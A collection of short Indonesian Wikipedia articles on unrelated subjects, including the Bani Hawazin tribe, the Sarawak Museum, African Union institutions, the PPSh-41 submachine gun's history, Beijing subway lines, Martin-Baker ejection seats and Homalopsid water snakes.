Bani Hawazin adalah salah satu kabilah Arab keturunan Qais 'Ailan, yaitu suku bangsa Arab yang menetap di wilayah sekitar Tha'if di Arabia. Keturunan Bani Hawazin tersebar di Timur Tengah dan Afrika Utara sebab anggota mereka banyak terlibat dalam penaklukan Muslim ke Suriah, Irak, Mesir, Afrika Utara (terutama Bani Hilal atau Bani Sulaim) dan Spanyol. Keturunan mereka di Suriah umumnya adalah Muslim Sunni, sedangkan keturunan mereka di Arabia saat ini dikenal dengan nama 'Utaibah.

Bani Hawazin merujuk pada tokoh bernama Hawazin bin Mansyur bin Ikrimah bin Khashafah bin Qais 'Ailan, yang adalah keturunan dari Adnan. Adnan menurut para ahli silsilah Arab merupakan salah satu keturunan Ismail, yang merupakan salah satu dari nenek moyang bagi suku-suku Arabia utara. Dari Bani Hawazin muncullah pecahan sukunya, antara lain Bani Sa'ad bin Bakar, Bani Jasyam bin Bakar, Bani Nashar bin Muawiyah, Bani Tsaqif, dan banyak lagi, yang membentuk persekutuan Hawazin ("Ulya Hawazin"). Persekutuan kabilah Hawazin tersebut sering bekerja sama dalam menghadapi persaingan dengan kabilah besar lain, misalnya menghadapi Bani Quraisy di Mekkah.

Setelah Muslim menaklukkan Mekkah, banyak suku dan kaum badui Arab di sekitar Mekkah yang merupakan sekutu Bani Quraisy turut pula mengakui kepemimpinan Muhammad tanpa perlawanan. Namun Bani Hawazin dan para sekutunya sebagai saingan Mekkah memandang kejadian itu sebagai timbulnya kepemimpinan baru Bani Quraisy, yang kuat dan akan menjadi penghalang hagemoni mereka atas jazirah Arabia. Bani Hawazin segera melakukan mobilisasi dengan para sekutunya untuk berperang melawan Muslim dan Bani Quraisy, sehingga di antara kedua pihak terjadilah perang Hunain, perang Authas, dan pengepungan Tha'if. Dari suku-suku persekutuan Hawazin, hanya Bani Ka'ab dan Bani Kilab saja yang tidak memerangi pasukan Muslim. Akhir peperangan dan pengepungan tersebut adalah kemenangan besar bagi pihak Muslim. Atas permohonan utusan dari Bani Hawazin, seluruh tawanan dari pihak mereka sejumlah 6.000 orang dibebaskan, dan setelahnya masyarakat Bani Hawazin masuk Islam.

Berdasarkan hadits riwayat Abu Hurairah dan Ibnu Abbas, Al-Qur'an pada awalnya diturunkan dalam tujuh dialek bahasa Arab ("sab'ah ahruf"), di mana salah satunya adalah dalam dialek Bani Hawazin.




</doc>
<doc id="1757151" url="https://id.wikipedia.org/wiki?curid=1757151" title="Museum Serawak">
Museum Serawak

Museum Serawak adalah museum tertua di Kalimantan. Tempat tersebut didirikan pada 1888 dan dibuka pada 1891 di sebuah bangunan di Kuching, Sarawak. Naturalis Alfred Russel Wallace meminta Charles Brooke, Rajah Putih Sarawak kedua, untuk mendirikan museum tersebut.

"Sarawak Museum Journal" diterbitkan oleh staf museum tersebut. Jurnal tersebut pertama kali diterbitkan pada 1911, dengan John Moulton sebagai penyunting pertamanya, yang menjadikannya menjadi salah satu jurnal ilmu pengetahuan tertua di wilayah Asia Tenggara. Topik-topik yang disoroti meliputi sejarah, sejarah alam dan etnologi di pulau Kalimantan.

Sampai 1974, kepala museum tersebut disebut "Kurator":

Setelah itu, "Direktur" adalah gelar untuk kepala museum tersebut:





</doc>
<doc id="1757152" url="https://id.wikipedia.org/wiki?curid=1757152" title="Nabam Tuki">
Nabam Tuki

Nabam Tuki (kelahiran 7 Juli 1964) adalah Ketua Menteri Arunachal Pradesh ke-8 dan saat ini. Ia menggantikan Jarbom Gamlin sebagai ketua menteri pada 1 November 2011. Ia berasal dari Kongres Nasional India. Sebelum menjadi Ketua Menteri, Tuki menjabat sebagai menteri dalam beberapa kabinet negara bagian. Tuki mewakili konstituensi Sagalee di distrik Papumpare.

Tuki lahir pada 7 Juli 1964 dalam sebuah desa yang disebut Ompuli di sub-divisi Sagalee di bawah distrik Papum Pare. Ia adalah seorang lulusan, telah menikah dan memiliki tujuh anak -lima putri dan dua putra.


</doc>
<doc id="1757154" url="https://id.wikipedia.org/wiki?curid=1757154" title="Wisma Bapa Malaysia">
Wisma Bapa Malaysia

Wisma Bapa Malaysia yang juga dikenal sebagai Bangunan Tunku Abdul Rahman adalah gedung sekretariat negara bagian Sarawak yang berisi berbagai departemen pemerintahan, termasuk kantor ketua menteri. Tempat tersebut terletak di Petra Jaya, Kuching. Wisma Bapa Malaysia dirancang mirip dengan Gedung Parlemen Malaysia di Kuala Lumpur dalam beberapa aspek.



</doc>
<doc id="1757156" url="https://id.wikipedia.org/wiki?curid=1757156" title="Bagian Kuching">
Bagian Kuching

Bagian Kuching adalah salah satu dari sebelas divisi administratif di Sarawak, Malaysia. Awalnya disebut "Divisi Pertama", divisi tersebut adalah pusat dan titik awal dari Serawak modern. Divisi Kuching memiliki wilayah seluas 4,559.5 kilometer persegi.

Bagian Kuching terdiri dari tiga distrik administratif; Kuching, Bau, dan Lundu dan tiga subdistrik; Padawan, Siburan dan Sematan.

Jumlah penduduk di Divisi Kuching (sensus tahun 2010) adalah 705,546 orang. Hal ini membuat Divisi Kuching menjadi divisi paling berpenduduk di Sarawak. Kebanyakan penduduk di Divisi Kuching tinggal di Distrik Kuching.




</doc>
<doc id="1757157" url="https://id.wikipedia.org/wiki?curid=1757157" title="Daftar Ketua Menteri Sikkim">
Daftar Ketua Menteri Sikkim

Ketua Menteri Sikkim, sebuah negara bagian India utara, adalah kepala Pemerintahan Sikkim. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, tetapi otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Sikkim, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak 1975, Sikkim telah memiliki lima ketua menteri. Yang pertama adalah Kazi Lhendup Dorjee dari Kongres Nasional India. Pawan Kumar Chamling dari Front Demokratik Sikkim telah menjabat sebagai ketua Menteri Sikkim sejak 1994. Ia menduduki jabatan tersebut lebih lama ketimbang seluruh pendahulunya.



</doc>
<doc id="1757168" url="https://id.wikipedia.org/wiki?curid=1757168" title="John Bruton">
John Bruton

John Gerard Bruton () adalah seorang politikus Irlandia yang menjabat sebagai Taoiseach Irlandia dari tahun 1994 sampai 1997. Ia adalah seorang menteri di bawah dua taoiseach, Liam Cosgrave dan Garret FitzGerald, Bruton memegang sejumlah jabatan teratas di pemerintah Irlandia, termasuk menjadi Menteri Keuangan (1981-1982 dan 1986-1987), dan Menteri Perindustrian, Perdagangan, dan Pariwisata (1983-1986). Ia menjadi pemimpin Fine Gael pada tahun 1990 dan menjabat sebagai Taoiseach dari 1994 sampai 1997, memimpin pemerintahan Koalisi Pelangi yang terdiri atas Fine Gael-Partai Buruh-Demokrat Kiri.


</doc>
<doc id="1757171" url="https://id.wikipedia.org/wiki?curid=1757171" title="Hari Afrika">
Hari Afrika

Hari Afrika adalah hari peringatan pendirian Organisasi Kesatuan Afrika (OAU) pada tahun 1963 yang diadakan setiap tanggal 25 Mei. Pada hari tersebut, pemimpin 30 dari 32 negara merdeka di Afrika menandatangani piagam pendirian OAU di Addis Ababa, Ethiopia. Pada tahun 1991, OAU mendirikan Masyarakat Ekonomi Afrika. Tahun 2002, OAU mendirikan penggantinya, Uni Afrika. Hari Afrika bertujuan untuk merayakan kesatuan benua Afrika.
Tema Hari Afrika tahun 2012 adalah "Afrika dan Diaspora". Di New York City, Hari Afrika dirayakan pada tanggal 31 Mei. Di Nairobi, hari tersebut dirayakan di Taman Rekreasi Uhuru Park. Hari Afrika merupakan hari libur di enam negara Afrika, yaitu Ghana
, Mali, Namibia, Zambia, Lesotho, dan Zimbabwe. Akan tetapi, Hari Afrika juga dirayakan di negara-negara Afrika lainnya dan para perantau di luar Afrika.



</doc>
<doc id="1757174" url="https://id.wikipedia.org/wiki?curid=1757174" title="Kawasan di Uni Afrika">
Kawasan di Uni Afrika

Negara anggota Uni Afrika terbagi ke dalam lima kawasan geografis Uni Afrika. Semua negara Afrika adalah anggota Uni Afrika kecuali Maroko.

UA menganggap Diaspora Afrika sebagai kawasan keeenamnya.


</doc>
<doc id="1757175" url="https://id.wikipedia.org/wiki?curid=1757175" title="Ketua Organisasi Kesatuan Afrika">
Ketua Organisasi Kesatuan Afrika

Ketua Organisasi Kesatuan Afrika merupakan jabatan pemimpin Organisasi Kesatuan Afrika yang digilir sesuai kawasan.



</doc>
<doc id="1757177" url="https://id.wikipedia.org/wiki?curid=1757177" title="Sekretaris Jenderal Organisasi Kesatuan Afrika">
Sekretaris Jenderal Organisasi Kesatuan Afrika

Sekretaris Jenderal Organisasi Kesatuan Afrika adalah jabatan yang dipegang oleh pemimpin Sekretariat Organisasi Kesatuan Afrika.


</doc>
<doc id="1757178" url="https://id.wikipedia.org/wiki?curid=1757178" title="Let Us All Unite and Celebrate Together">
Let Us All Unite and Celebrate Together

"Let Us All Unite and Celebrate Together" (; ; ; ; ) adalah lagu kebangsaan Uni Afrika.



</doc>
<doc id="1757179" url="https://id.wikipedia.org/wiki?curid=1757179" title="Lambang Uni Afrika">
Lambang Uni Afrika

Lambang Uni Afrika terdiri dari peta Afrika polos berwarna emas di dalam dua lingkaran konsentris yang dihiasi daun palem di kedua sisi lingkaran terluar.

Meski sayembara lambang dan bendera UA pernah diselenggarakan ketika UA baru dibentuk, Majelis Uni Afrika memutuskan di konferensi Addis Ababa tahun 2004 bahwa mereka akan mempertahankan lambang dan bendera pendahulunya, Organisasi Kesatuan Afrika, sebagai lambang dan bendera resmi Uni Afrika.

Daun palem bermakna perdamaian. Lingkaran emas melambangkan kekayaan dan masa depan Afrika yang cerah, sedangkan lingkaran hijau melambangkan harapan dan keinginan Afrika untuk bersatu. Peta Afrika yang polos menggambarkan kesatuan Afrika, sedangkan rangkaian lingkaran merah di bawah lambang berarti solidaritas Afrika dan darah yang ditumpahkan demi membebaskan Afrika.



</doc>
<doc id="1757181" url="https://id.wikipedia.org/wiki?curid=1757181" title="Negara anggota Uni Afrika">
Negara anggota Uni Afrika

Negara anggota Uni Afrika adalah 55 negara berdaulat yang telah meratifikasi atau menandatangani Undang-Undang Dasar Uni Afrika untuk menjadi negara anggota Uni Afrika (UA). UA merupakan pengganti Organisasi Kesatuan Afrika (OKA). Keanggotaan UA terbuka bagi semua negara anggota OKA. 18 perluasan organisasi telah terjadi sejak OKA didirikan tanggal 25 Mei 1963. Perluasan terbesar terjadi pada tanggal 18 Juli 1975 ketika empat negara bergabung dengan organisasi tersebut. Sudan Selatan adalah negara anggota terbaru yang bergabung pada tanggal 27 Juli 2011. Saat ini hanya ada satu anggota, Republik Afrika Tengah, yang ditangguhkan karena mengalami kudeta dan perebutan kekuasaan. Satu-satunya negara anggota PBB asal Afrika yang dapat bergabung, atau lebih tepatnya bergabung lagi sebagai anggota, adalah Maroko. Maroko menarik keanggotaannya setelah organisasi ini menerima keanggotaan Republik Demokratik Arab Sahrawi yang statusnya diragukan sampai Masuk Kembali sebagai Anggota baru Uni Afrika Tahun 2017. Spanyol, sebuah negara Eropa, memiliki sejumlah wilayah di daratan Afrika dan Kepulauan Canary di lepas pantai Afrika, dan diakui secara resmi oleh Uni Afrika.

Uni Afrika terdiri dari 52 republik dan 3 kerajaan. Jumlah penduduk UA mencapai 1.068.890.550 (2013).

Afrika Selatan bergabung pada tanggal 6 Juni 1994 setelah apartheid berakhir dan pemilu April 1994 diselenggarakan.

Sudan Selatan berpisah dari Sudan tanggal 9 Juli 2011 dan bergabung dengan UA tanggal 27 Juli 2011. Setelah hasil referendum kemerdekaan Sudan Selatan diumumkan, UA menyatakan bahwa mereka "bersedia pada akhir masa interim, yaitu tanggal 9 Juli 2011, untuk menyambut negara anggota ke-54 Uni Afrika". Sudan Selatan adalah negara anggota terbaru. Maroko adalah satu-satunya negara di Afrika yang masih bisa bergabung jika mau (atau lebih tepatnya bergabung lagi).

Saat ini hanya ada satu anggota, Republik Afrika Tengah, yang Ditangguhkan karena mengalami kudeta dan perebutan kekuasaan.

Uni Afrika terdiri dari 52 republik dan 3 kerajaan. Dulu banyak kerajaan yang menjadi anggota UA sebelum akhirnya bubar satu per satu.


</doc>
<doc id="1757182" url="https://id.wikipedia.org/wiki?curid=1757182" title="Afrika Latin Serikat">
Afrika Latin Serikat

Afrika Latin Serikat (Prancis: "Les États-Unis de l'Afrique Latine", Portugal: "Estados Unidos da África Latina", Spanyol: "Estados Unidos de África Latina") adalah perserikatan negara-negara Afrika Tengah berbahasa Roman yang diusulkan oleh Barthélémy Boganda. Boganda pertama kali mengutarakan idenya pada bulan Mei 1957.

Negara-negara yang akan menjadi bagian dari perserikatan federal besar ini adalah Angola, Republik Demokratik Kongo, Rwanda, Burundi, Republik Kongo, Republik Afrika Tengah, Chad, wilayah Kamerun berbahasa Prancis, Gabon, dan Guinea Khatulistiwa. Pelaksanaannya terhambat setelah Boganda meninggal dunia akibat kecelakaan pesawat pada tanggal 29 Maret 1959. Boganda menganggap perserikatan ini sebagai penyeimbang blok Afrika Selatan dan Federasi Rhodesia dan Nyasaland yang sangat dipengaruhi Britania Raya.

Ide Afrika Latin Serikat dikritik oleh Richard Wright dalam pengantar khusus bagi pembaca Prancis dalam buku "White Man, Listen!". Ia beralasan bahwa Afrika Latin berarti Afrika Katolik sehingga menciptakan jurang pemisah dengan Afrika Protestan yang berbahasa Inggris dan sekuler. Menurut Wright, ide ini mencerminkan perilaku orang Afrika yang mengenyam pendidikan di Prancis atau Britania Raya, dua negara terkuat di Eropa waktu itu. Ia justru mengusulkan pendekatan Pan-Afrika.



</doc>
<doc id="1757185" url="https://id.wikipedia.org/wiki?curid=1757185" title="SMK Purnama Bakti">
SMK Purnama Bakti

SMK Purnama Bakti adalah sebuah sekolah menengah kejuruan swasta yang berada di Kabupaten Bogor, Jawa Barat. Sekolah ini memiliki 2 kompetisi keahlian yaitu Teknik Komputer dan Jaringan dan Rekayasa Perangkat Lunak.

SMK Purnama Bakti berada di bawah naungan Yayasan Amal Bakti. Sekolah ini didirikan pada tahun 2007 oleh Drs. K.H. Sakarwinata, S.Sg., M.M.Pd.



</doc>
<doc id="1757193" url="https://id.wikipedia.org/wiki?curid=1757193" title="Penyakit karat">
Penyakit karat

Penyakit karat adalah segolongan penyakit tumbuhan yang disebabkan oleh golongan cendawan (fungi) yang termasuk dalam bangsa (ordo) Pucciniales.

Penyakit ini paling jelas gejalanya terlihat pada daun, sehingga disebut karat daun. Gejala dicirikan oleh munculnya bercak berwarna coklat kemerahan pada daun yang semakin lama semakin membesar. Bercak ini biasanya dikelilingi oleh jaringan berwarna kuning akibat daun mengalami klorosis. Selain daun, dampak dan gejala penyakit ini dapat tampak pula di buah, batang, pucuk, serta beberapa jaringa lain yang berklorofil. Penyakit karat juga menyebabkan deformasi, perubahan bentuk organ tanaman.

Contoh penyakit karat:


</doc>
<doc id="1757197" url="https://id.wikipedia.org/wiki?curid=1757197" title="PPSh-41">
PPSh-41

PPSh-41 ("Pistolet-Pulemyot-Shpagina; ""Pistol mesin Shpagin"; Bahasa Russia: Пистолет-пулемёт Шпагина) adalah mitralyur ringan Soviet yang didesain oleh Georgi Shpagin sebagai alternatif yang murah dan sederhana terhadap PPD-40. Nama sebutan yang paling biasa disebut adalah "Pe-Pe-Sha" dari 3 huruf awalan PPSh-41 dan juga disebut "Papasha" (Bahasa Russia: папаша) yang berarti "ayah".

PPSh adalah sebuah senapan mesin ringan yang terisi oleh magasin, dan penembakan selektif yang menggunakan baut terbuka dan aksi "blowback". Terbuat hampir seluruhnya oleh baja yang dicap, PPSh-41 dapat diisi maupun dengan magasin kotak atau magasin drum, dan menembakkan 7.62x25mm peluru pistol Tokarev.

PPSh-41 digunakan dengan luas dalam pertempuran selama Perang Dunia II dan Perang Korea. Itu merupakan salah satu senjata infanteri utama dalam Angkatan Bersenjata Soviet selama Perang Dunia II. Sebanyak 6 juta PPSh-41 telah diproduksi. Di dalam bentuk Tipe 50 buatan Cina (Kopian yang berlisensi), Itu masih dipakai oleh orang-orang Vietnam Viet Cong hingga akhir 1970. Menurut edisi 2002 dari "The Encyclopedia of Weapons of World War II, "PPSh tersebut masih digunakan oleh pasukan militer tidak teratur.

Dorongan untuk pengembangan PPSh datang sebagian dari Perang Musim Dingin melawan Finlandia, dimana Pasukan Finlandia memakai senapan mesin ringan Suomi KP/-31 sebagai alat yang sangat efektif dalam pertempuran jarak dekat di hutan dan di lingkungan kota.

Walaupun PPD-40 dilarikan ke produksi massal pada tahun 1940, PPD-40 mahal untuk diproduksi, dalam hal sumber daya alam dan sumber daya manusia, karena PPD-40 menggunakan banyak bagian logam giling, khususnya penerimanya. Ide utama Shpagin untuk pengurangan biaya adalah untuk memakai logam yang dicap untuk produksi sebagian besar bagian senjatanya, konsep tersebut merupakan revolusioner di Uni Soviet pada saat itu. Shpagin membuat purwarupa pada bulan September 1940, yang termasuk sebuah kompensator gas sederhana yang didesain untuk mencegah moncong PPSh-41 untuk naik ke atas saat ditembak, ini mengimprovasi tembakan pengelompokan sekitar 70% mirip dengan PPD.

Senjata baru diproduksi dalam jaringan pabrik di Moskow, dengan anggota partai lokal tingkat tinggi dibuat langsung bertanggung jawab untuk memenuhi target produksi. Beberapa ratus senjata yang diproduksi pada bulan November 1941 dan 155.000 lainnya dilakukan selama lima bulan ke depan. Pada musim semi 1942, pabrik PPSh memproduksi sekitar 3.000 unit per hari. Angka produksi Soviet untuk 1942 menunjukkan bahwa hampir 1,5 juta unit yang diproduksi. PPSh - 41 adalah contoh klasik dari desain yang disesuaikan untuk produksi massal (contoh lain dari desain masa perang seperti senapan mesin ringan M3, MP40, PPS, dan Sten). Bagian-bagiannya (tidak termasuk laras) bisa diproduksi oleh tenaga kerja yang relatif tidak terampil dengan peralatan sederhana yang tersedia di garasi perbaikan mobil atau toko timah, membebaskan pekerja lebih terampil untuk tugas-tugas lainnya. PPSh - 41 menggunakan 87 komponen dibandingkan dengan 95 untuk PPD - 40 dan PPSh dapat diproduksi dengan perkiraan 5,6 jam mesin (kemudian direvisi menjadi 7,3 jam) dibandingkan dengan 13,7 jam untuk PPD. Produksi per barel sering disederhanakan dengan menggunakan barel untuk 7.62mm M1891 Mosin-Nagant, laras senapan dipotong setengah dan dua barel PPSh dibuat dari itu setelah mesin ruang untuk peluru senapan mesin ringan Soviet 7.62mm.

Setelah Angkatan Darat Jerman menangkap sejumlah besar PPSh-41 selama PD II, sebuah program dilembagakan untuk mengkonversi senjata tersebut menjadi peluru senjata mesin ringan Jerman standar - 9mm Parabellum. Wehrmacht secara resmi mengadopsi PPSh-41 yang terkonversi sebagai "MP41(r)", PPSh-41 yang tidak dikonversi ditunjuk sebagai "MP717(r)" dan disuplai dengan amunisi 7.63×25mm Mauser (Identik secara dimensi dengan 7.62x25mm Mauser, tetapi sedikit lebih lemah). Buku manual berbahasa Jerman untuk pemakaian PPSh yang ditangkap dicetak dan didistribusikan ke dalam "Wehrmacht" .

PPSh - 41 menderita masalah dengan magasin drum yang dapat diandalkannya. Awalnya terbuat dari logam cap yang hanya 0,5 mm itu rawan untuk deformasi yang mengarah ke kemacetan. PPSh juga relatif mahal untuk memproduksi dan cukup lambat untuk mengisi. PPSh-41 sebagian besar digantikan oleh magasin kotak sederhana yang hanya memegang 35 peluru, meskipun sebuah magasin drum yang ditingkatkan yang terbuat dari 1 mm baja tebal diperkenalkan pada tahun 1944.

PPS, sebuah senapan mesin yang lebih sederhana yang kemudian diperkenalkan di Soviet pada tahun 1943, meskipun tidak menggantikan PPSh - 41 selama perang.

Uni Soviet juga bereksperimen dengan PPSh - 41 dalam peran dukungan udara anti - personil, pemasangan puluhan senapan mesin ringan di rak pesawat depan pada varian Tu - 2SH dari Tupolev Tu - 2 bomber.

Lebih dari lima juta senapan mesin ringan PPSh diproduksi pada akhir perang. Soviet sering membekali peleton dan kadang-kadang seluruh kompani dengan senjata tersebut, memberi mereka kekuatan senjata jarak pendek yang sempurna. Ribuan lainnya dijatuhkan di belakang garis musuh untuk melengkapi formasi partisan untuk mengganggu jalur pasokan Jerman dan komunikasi.

Setelah Perang Dunia Kedua, PPSh dipasok dalam jumlah besar untuk negara-negara klien Soviet dan pasukan gerilya komunis. Tentara Rakyat Korea (KPA) dan Tentara Relawan Rakyat Cina (PVA) yang bertempur di Korea menerima sejumlah besar PPSh - 41, selain Tipe Korea Utara 49 dan Tipe Cina 50 yang berlisensi salinan PPSh - 41 dengan revisi mekanis kecil. Senjata itu digunakan secara luas selama Perang Korea.

Walaupun relatif tidak akurat, PPSh Cina memiliki tingkat tembak yang tinggi dan cocok dengan baku tembak jarak dekat yang biasanya terjadi dalam konflik itu, terutama pada malam hari. Pasukan PBB di pos-pos pertahanan atau berpatroli sering mengalami kesulitan mengembalikan volume tembak yang cukup ketika diserang oleh kompani infanteri bersenjata dengan PPSh. Beberapa petugas infanteri AS menyebut PPSh sebagai senjata tempur terbaik perang, walau kekurangan akurasi dari M1 Garand dan M1 karabin milik AS, PPSh memberikan daya tembak lebih pada jarak pendek. Sebagai Kapten infanteri (yang kemudian menjadi Jendral) Hal Moore, menyatakan: "Dalam kondisi otomatis, PPSh menembak banyak peluru dan sebagian besar pembantaian di Korea dilakukan dalam jarak yang pendek dan dilakukan dengan sangat cepat - dalam soal siapa yang berespon lebih cepat. Dalam situasi seperti itu PPSh mengalahkan baik dalam kelas maupun persenjataan atas semua yang kita miliki. Sebuah pertempuran patroli jarak dekat usai dengan sangat cepat dan biasanya kita kalah karena senjata tersebut." Tetapi prajurit AS lainnya, merasa kalau M2 Karabin mereka lebih unggul dari PPSh - 41 dalam jarak keterlibatan biasa dari 100 hingga 150 meter.

PPSh-41 menembak peluru standar pistol dan senapan mesin ringan Soviet, yaitu peluru 7.62x25mm (Tokarev). Dengan berat sekitar 12 pon (5.45 kg) dengan sebuah magasin drum yang terisi 71 peluru dan 9.5 pon (4.32 kg) dengan sebuah magasin box yang berisi 35 peluru, PPSh dapat menembakkan 1000 peluru per menit, sebuah laju tembak yang sangat tinggi jika dibandingkan dengan sebagian besar senapan mesin ringan lainnya dalam PD II. PPSh adalah sebuah senjata yang tahan lama, yang memerlukan sedikit perawatan yang dibuat dengan komponen yang murah dan mudah didapat, terutama dari besi yang dicap dan kayu. Produksi terakhir PPSh memiliki injeksi tinggi dan sebuah alat pembidik belakang berbentuk "L" yang bisa diatur untuk jarak 100 dan 200 meter. Sebuah kompensator mentah telah dibuat dalam jaket laras, dengan tujuan untuk mengurangi naiknya moncong selama tembakan otomatis. Kompensator tersebut cukup sukses, tetapi kompensator tersebut meningkatkan kilatan cahaya moncong dan adanya laporan tentang senjata tersebut. PPSh juga memiliki sebuah penerima berengsel untuk memudahkan bidang - pengupasan dan memudahkan untuk membersihkan senjata tersebut.


</doc>
<doc id="1757202" url="https://id.wikipedia.org/wiki?curid=1757202" title="Jalur Changping, Beijing Subway">
Jalur Changping, Beijing Subway

Jalur Changping Beijing Subway () adalah salah satu jalur angkutan cepat di utara kota Beijing. Jalur ini mulai dibangun tahun 2009. Konstruksi tahap I selesai bulan September 2010, kemudian dilakukan uji jalan selama 3 bulan. Jalur ini resmi dibuka tanggal 30 Desember 2010 dan sampai saat ini memiliki rute dari stasiun Xi'erqi (Jalur 13 ke Nanshao. Panjang rutenya 21.24 km dengan 7 stasiun, hanya stasiun Nanshao yang berada di bawah tanah.

Setelah fase kedua selesai, Jalur Changping akan diperpanjang ke utara sampai Thirteen Tombs Scenic Area.



</doc>
<doc id="1757205" url="https://id.wikipedia.org/wiki?curid=1757205" title="Jalur Fangshan, Beijing Subway">
Jalur Fangshan, Beijing Subway

Jalur Fangshan Beijing Subway () adalah jalur angkutan cepat di barat kota Beijing yang memiliki rute dari Suzhuang di Distrik Fangshan ke Guogongzhuang di Distrik Fengtai. Jalur ini memiliki panjang rute dengan 11 stasiun. Dibuka 31 Desember 2010.

Sampai Maret 2014, jalur Fangshan hanya terhubung dengan satu jalur lainnya, yaitu Jalur 9 di Guogongzhuang. Ketika perpanjangannya selesai, jalur ini akan diperpanjang ke utara dekat Third Ring Road, dan akan terhubung dengan Jalur 10 di Shoujingmao dan Jalur 16 di Fengyiqiao Selatan. Ujung selatan di Suzhuang akan menjadi ujung utara untuk Jalur Yanfang.


</doc>
<doc id="1757206" url="https://id.wikipedia.org/wiki?curid=1757206" title="Margaret Brooke">
Margaret Brooke

Margaret, Lady Brooke, Ranee Sarawak (1849 – 1936) adalah ratu permaisuri dari Raja Putih Sarawak kedua, Charles Anthony Johnson Brooke. Ia menerbitkan memoirnya "My Life in Sarawak" pada 1913, yang mengisahkan tentang kehidupannya di Astana di Kuching dan kolonial Kalimantan.

Ranee menjadi terkenal pada masa hidupnya sebagai wanita yang kuat dan cerdas, serta kedudukan istimewanya sebagai anggota kerajaan Eurasia.

Brooke sangat mencintai istrinya. Astana dibangun khusus untuknya sebagai persembahan pernikahan. Dan Benteng Margherita, yang juga berada di Kuching, dinamai dari namanya.
Lahir dengan nama Margaret Alice Lili de Windt, ia adalah putri dari Kapten Joseph Clayton Jennyns de Windt, dari Blunston Hall, dan istrinya, Elizabeth Sarah Johnson. Saudaranya, Harry de Windt, adalah seprang penjelajah terkenal.

Margaret de Windt menikah dengan Rajah Charles di Highworth, Wiltshire pada 28 Oktober 1869. Ia diberikan kedudukan sebagai Ranee Sarawak dengan gelar Her Highness pada hari pernikahannya. Ia datang ke Sarawak pada awal 1870an.

Pasangan tersebut memiliki enam anak, tiga di antara selamat saat dilahirkan:
Salah satu dongeng Oscar Wilde, "The Young King", didedikasikan untuk "Margareth, Lady Brooke, Ranee Sarawak".


</doc>
<doc id="1757210" url="https://id.wikipedia.org/wiki?curid=1757210" title="Daftar Wakil Ketua Mahkamah Agung Republik Indonesia">
Daftar Wakil Ketua Mahkamah Agung Republik Indonesia

Wakil Ketua Mahkamah Agung Republik Indonesia adalah pejabat negara yang melaksanakan tugas Kekuasaan Kehakiman. Wakil Ketua Mahkamah Agung terdiri atas wakil ketua bidang yudisial dan wakil ketua bidang nonyudisial. Wakil ketua bidang yudisial membawahi ketua muda perdata, ketua muda pidana, ketua muda agama, ketua muda militer, dan ketua muda tata usaha negara. Wakil ketua bidang non-yudisial membawahi ketua muda pembinaan dan ketua muda pengawasan. Wakil Ketua Mahkamah Agung dipilih dari dan oleh hakim agung dan ditetapkan oleh Presiden.



</doc>
<doc id="1757211" url="https://id.wikipedia.org/wiki?curid=1757211" title="Jalur Yizhuang, Beijing Subway">
Jalur Yizhuang, Beijing Subway

Jalur Yizhuang Beijing Subway (), adalah jalur angkutan cepat yang menghubungkan Yizhuang Industrial Park dengan jaringan angkutan cepat Beijing. Memiliki jalur sepanjang is dengan 14 stasiun, termasuk 6 dibawah tanah dan 8 melayang. Rutenya dari Songjiazhuang, ujung selatan dari Line 5, Beijing Subway di Fengtai District ke Stasiun Kereta Yizhuang di Tongzhou District. Total investasi untuk jalur ini diperkirakan ¥1.2 milyar.Konstruksi dimulai 8 Desember 2007 dan resmi dibuka 30 Desember 2010.


</doc>
<doc id="1757216" url="https://id.wikipedia.org/wiki?curid=1757216" title="Martin-Baker">
Martin-Baker

Martin-Baker Aircraft Co Ltd adalah produsen Inggris untuk kursi ejeksi lontar dan peralatan yang terkait dengan keselamatan bagi penerbangan. Asal perusahaan awalnya sebagai produsen pesawat sebelum menjadi pelopor dalam bidang kursi ejeksi. Kantor pusat perusahaan berada di Higher Denham, Buckinghamshire, Inggris dengan situs lain di Prancis, Italia dan Amerika Serikat.

Martin-Baker memasok kursi ejeksi untuk 93 angkatan udara di seluruh dunia. Kursi Martin-Baker telah dipasang ke lebih dari 200 pesawat sayap tetap dan jenis rotary dengan program terbaru Lockheed Martin F-35 Lightning II.

Martin-Baker menyatakan pada 2014 bahwa sejak tes pertama ejeksi pada tahun 1946, total 7.450 jiwa telah diselamatkan oleh kursi ejeksi perusahaan.

Martin-Baker juga memproduksi kursi crashworthy dirancang untuk helikopter dan pesawat sayap tetap. Pada 2012, lebih dari 20.000 kursi crashworthy telah disampaikan.



</doc>
<doc id="1757220" url="https://id.wikipedia.org/wiki?curid=1757220" title="NPP Zvezda K-36">
NPP Zvezda K-36

Zvezda K-36 adalah serangkaian kursi lontar yang dibuat oleh NPP Zvezda.

Varian dari kursi lontar ini telah digunakan pada berbagai pesawat, termasuk Su-25, Su-27, MiG-29, dan Sukhoi T-50.



</doc>
<doc id="1757221" url="https://id.wikipedia.org/wiki?curid=1757221" title="Enhydris">
Enhydris

Enhydris adalah genus ular air dari suku Homalopsidae yang tersebar di Asia Tenggara. Semula, genus ini meliputi 25 spesies, namun sekarang hanya terdiri dari 6 speies. Dari 6 spesies tersebut, mayoritas terdapat di tanah Siam (Thailand) dan tanah Indo-Cina (Laos, Vietnam, Kamboja), hanya "Enhydris enhydris" (Ular-air pelangi) yang luas agihannya.


Beberapa spesies yang sebelumnya termasuk dalam genus ini yaitu:



</doc>
<doc id="1757222" url="https://id.wikipedia.org/wiki?curid=1757222" title="Homalopsis">
Homalopsis

Homalopsis (Ular air bertopeng) adalah genus utama dari suku Homalopsidae. Ular ini memiliki ciri-ciri yang mudah dikenali, yakni pola di wajahnya yang seperti topeng berbentuk kupu-kupu. Nama ilmiahnya, "Homalos-opsis"="wajah busa". Nama umumnya dalam bahasa inggris adalah "Masked water snake" atau "Puff-faced water snake", nama yang juga disematkan kepada tipe spesies genus ini, "Homalopsis buccata" (Ular-air belang). Terdapat 5 spesies.




</doc>
